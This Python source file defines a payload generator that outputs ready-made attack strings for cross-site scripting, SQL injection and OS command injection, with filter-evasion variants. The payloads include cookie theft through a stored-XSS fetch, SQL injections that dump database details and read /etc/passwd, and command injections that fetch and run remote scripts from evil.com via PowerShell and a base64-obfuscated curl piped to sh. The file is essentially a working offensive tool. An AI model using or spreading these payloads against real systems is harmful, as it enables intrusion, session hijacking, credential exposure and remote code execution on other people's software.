from enum import Enum
import random
import string

class PayloadType(Enum):
    XSS = 1
    SQL_INJECTION = 2
    COMMAND_INJECTION = 3

class PayloadGenerator:
    def generate(self, payload_type, technique=None, bypass=False, os_type="linux"):
        if payload_type == PayloadType.XSS:
            return self._generate_xss(technique, bypass)
        elif payload_type == PayloadType.SQL_INJECTION:
            return self._generate_sqli(technique, bypass)
        elif payload_type == PayloadType.COMMAND_INJECTION:
            return self._generate_cmdi(os_type, bypass)
        else:
            raise ValueError("Invalid payload type")

    def _generate_xss(self, technique, bypass):
        payloads = []
        
        # Base payloads
        base_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(document.cookie)>"
        ]
        
        # Technique-specific payloads
        if technique == "dom":
            payloads.extend([
                "<svg onload=alert(1)>",
                "javascript:alert(document.domain)",
                "#<script>alert(1)</script>"
            ])
        elif technique == "stored":
            payloads.extend([
                "<script>fetch('/steal?cookie='+document.cookie)</script>",
                "<link rel=stylesheet href='javascript:alert(1)'>"
            ])
        else:  # reflected/default
            payloads.extend(base_payloads)
        
        # Bypass techniques
        if bypass:
            payloads.extend([
                "<img src=x:g onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",  # Base64 encoded
                "<svg><script>alert&#40;1&#41;</script>",
                "<img src='x'onerror='alert`1`'>",  # Backticks
                "<iframe srcdoc='<script>alert(1)</script>'>",
                "<script/*>alert(1)</script/*>",  # Comment bypass
                "<script>\u0000alert(1)</script>",  # Null byte
                "<a href=\"javascript:alert`${document.domain}`\">click</a>"
            ])
        
        return payloads

    def _generate_sqli(self, technique, bypass):
        payloads = []
        
        # Technique-specific payloads
        if technique == "error":
            payloads.extend([
                "' OR 1=1 -- ",
                "\" OR \"a\"=\"a",
                "' OR SLEEP(5) -- ",
                "' AND EXTRACTVALUE(rand(),CONCAT(0x3a,version())) -- "
            ])
        elif technique == "blind":
            payloads.extend([
                "' AND 1=IF(SUBSTR(version(),1,1)='5',SLEEP(5),0) -- ",
                "' OR ASCII(SUBSTR((SELECT user),1,1))=114 -- ",
                "' AND SELECT SUBSTRING(password,1,1) FROM users='a"
            ])
        else:  # union/default
            payloads.extend([
                "' UNION SELECT null,version() -- ",
                "' UNION SELECT user(),database() -- ",
                "' UNION SELECT @@version,LOAD_FILE('/etc/passwd') -- "
            ])
        
        # Bypass techniques
        if bypass:
            payloads.extend([
                "id=1'/*!50000UNION*//*!50000SELECT*/ 1,2,3-- -",  # MySQL versioned comments
                "id=1'%0a/**/UNION/**/%0aSELECT/**/1,2,3--+",  # Whitespace
                "id=1' uNiOn aLl sElEcT 1,2,3-- -",  # Case variation
                "' OR 1=1 /*!0aNd*/ '1'='1",  # Keyword splitting
                "' UNION SELECT 1,2,3 FROM DUAL WHERE 1=1 AND 1=0-- -",  # Dual table
                "'||(SELECT 0x4F525C4B)||'"  # Hex encoding
            ])
        
        return payloads

    def _generate_cmdi(self, os_type, bypass):
        payloads = []
        
        # OS-specific payloads
        if os_type == "windows":
            payloads.extend([
                "& whoami",
                "| net user",
                "&& ipconfig /all",
                "%ComSpec% /c whoami"
            ])
        else:  # linux
            payloads.extend([
                ";id",
                "&& whoami",
                "| cat /etc/passwd",
                "`echo bHM= | base64 -d`"  # Encoded 'ls'
            ])
        
        # Bypass techniques
        if bypass:
            if os_type == "windows":
                payloads.extend([
                    "powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
                    "cmd /c \"set /p=whoami\"<NUL",  # No space
                    "mshta javascript:alert(1);close();",  # HTA execution
                    "wmic process call create calc.exe"  # WMIC bypass
                ])
            else:
                payloads.extend([
                    "${IFS}whoami",  # Internal Field Separator
                    "who\"am\"i",  # Quote bypass
                    "w'h'o'a'm'i",  # Character separation
                    "echo${IFS}Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=|base64${IFS}-d|sh",  # Encoded payload
                    "awk 'BEGIN {system(\"whoami\")}'"  # Alternative command
                ])
        
        return payloads
